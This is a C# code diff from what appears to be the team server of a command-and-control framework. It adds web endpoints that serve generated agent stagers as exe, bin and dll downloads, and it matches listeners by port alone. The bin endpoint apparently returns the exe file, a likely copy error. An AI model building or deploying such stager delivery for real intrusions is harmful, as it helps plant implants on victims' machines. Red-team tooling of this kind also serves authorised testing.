@@ -170,12 +170,12 @@ namespace TeamServer.Models
         }
 
 
-        public IActionResult DownloadStager()
+        public IActionResult DownloadStagerExe()
         {
             Listener currentListener = null;
             foreach (var listener in _listenerService.GetListeners())
             {
-                if (this.Request.Host.Host == listener.Ip && this.Request.Host.Port == listener.BindPort)
+                if (this.Request.Host.Port == listener.BindPort)
                 {
                     currentListener = listener;
                     break;
@@ -197,7 +197,67 @@ namespace TeamServer.Models
                 fs.Read(fileBytes, 0, (int)fs.Length);
             }
 
-            return File(fileBytes, "application/octet-stream", "stager_update.exe");
+            return File(fileBytes, "application/octet-stream", "stager.exe");
+        }
+
+        public IActionResult DownloadStagerBin()
+        {
+            Listener currentListener = null;
+            foreach (var listener in _listenerService.GetListeners())
+            {
+                if (this.Request.Host.Port == listener.BindPort)
+                {
+                    currentListener = listener;
+                    break;
+                }
+            }
+
+            if (currentListener == null)
+                return NotFound("No corresponding Listener");
+
+            var path = this._fileService.GetListenerPath(currentListener.Name);
+            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
+            if (!System.IO.File.Exists(fileName))
+                return NotFound();
+
+            byte[] fileBytes = null;
+            using (FileStream fs = System.IO.File.OpenRead(fileName))
+            {
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
+            }
+
+            return File(fileBytes, "application/octet-stream", "stager.bin");
+        }
+
+        public IActionResult DownloadStagerDll()
+        {
+            Listener currentListener = null;
+            foreach (var listener in _listenerService.GetListeners())
+            {
+                if (this.Request.Host.Port == listener.BindPort)
+                {
+                    currentListener = listener;
+                    break;
+                }
+            }
+
+            if (currentListener == null)
+                return NotFound("No corresponding Listener");
+
+            var path = this._fileService.GetListenerPath(currentListener.Name);
+            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
+            if (!System.IO.File.Exists(fileName))
+                return NotFound();
+
+            byte[] fileBytes = null;
+            using (FileStream fs = System.IO.File.OpenRead(fileName))
+            {
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
+            }
+
+            return File(fileBytes, "application/octet-stream", "stager.dll");
         }
     }
 }
